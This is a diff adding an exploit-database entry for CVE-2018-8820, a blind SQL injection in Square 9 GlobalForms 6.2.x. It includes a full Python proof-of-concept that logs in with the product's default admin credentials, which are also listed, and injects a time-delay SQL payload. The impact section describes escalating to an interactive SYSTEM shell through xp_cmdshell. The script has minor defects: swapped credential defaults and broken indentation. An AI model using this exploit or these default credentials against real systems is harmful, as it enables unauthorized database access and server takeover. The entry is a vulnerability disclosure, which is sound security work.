@@ -1,0 +1,108 @@
+id: 30067
+date: 03/29/2018
+title: Square 9 GlobalForms 6.2.x Blind SQL Injection Exploit
+author: Darrell Damstedt
+cves: CVE-2018-8820
+
+# Blind SQL Injection in Square 9 GlobalForms <= 6.2.x (CVE-2018-8820)
+
+## Product Description
+
+GlobalFormsA(r) is Square 9as powerful web forms product.  GlobalForms can
+live separate of GlobalSearch and runs on a separate Web Engine.
+
+## Vulnerability Type
+
+Blind SQL injection
+
+## Vulnerability Description
+
+Square 9 GlobalForms versions 6.2.x (and possibly others) are vulnerable to
+blind SQL injection in the match parameter wihtin the
+"/frevvo/web/tn/d/users?match=" path. This is a remotely accessible,
+authenticated function within default Square 9 GlobalForms instances.
+
+## Exploit
+
+A proof of concept is available here:
+https://github.com/hateshape/frevvomapexec
+
+frevvomapexec.py:
+
+#!/usr/bin/python
+import sys
+import argparse
+import datetime
+import requests
+from argparse import RawTextHelpFormatter
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def sqli(target, port, username, password, seconds):
+    sqlpayload = "')waitfor%20delay'0%3a0%3a" + str(seconds) + "'--"
+    s = requests.session()
+    login_data = {'username': 'admin@d', 'password': 'admin', 'lAction':'Login'}
+    m = s.post('https://' + target + ':' + port + '/frevvo/web/login', data=login_data, verify=False
+)
+
+    print "Delay #1: " + str(datetime.datetime.utcnow())
+    r = s.get(('https://' + target + ':' + port + "/frevvo/web/tn/d/users?match=t" + sqlpayload), verify=False, cookies=s.cookies)
+
+    print "Delay #2: " +  str(datetime.datetime.utcnow())
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="""
+            
+        Proof of Concept script for vulnerability validation.
+         - Type of issue: Authenticated SQL injection
+         - Product: Square 9 GlobalForms 6.2 
+         - Version: v6.2.1.27377""",formatter_class=RawTextHelpFormatter)
+
+    Required = parser.add_argument_group('Required')
+    #Required
+    Required.add_argument('-t', '--target', help='Target URL or IP Address', required=True)
+    Required.add_argument('-s','--seconds',  help='Number of seconds to pause Frevvo', required=True)
+    Required.add_argument('-o','--port',  help='Frevvo Web Server Port', required=True)
+
+    #Optional
+    parser.add_argument('-u', '--username', help='Login Username', default='admin', action="store_true", required=False)
+    parser.add_argument('-p', '--password', help='Login Password', default='admin@d', action="store_true", required=False)
+    
+    args = parser.parse_args()
+
+    sqli(args.target,args.port,args.username,args.password,args.seconds)
+
+    if len(sys.argv) == 1:
+parser.print_help()
+
+
+
+## Versions
+
+Square 9 GlobalForms <= 6.2.x
+
+## Attack Type
+
+Authenticated, Remote
+
+# Default Credentials
+Username: admin
+Password: admin@d
+
+## Impact
+
+The SQL injection vulnerability can be used to exfiltrate sensitive
+information from the MSSQL DBMS used with GlobalForms. In every case that
+was tested the DBMS was running with SYSTEM privileges and was successfully
+used in conjunction with xp_cmdshell to establish an interactive shell.
+
+## Credit
+
+This vulnerability was discovered by Darrell Damstedt <hateshape () gmail
+com>.
+
+## References
+
+CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8820
+
+#  0day.today [2023-03-25]  #
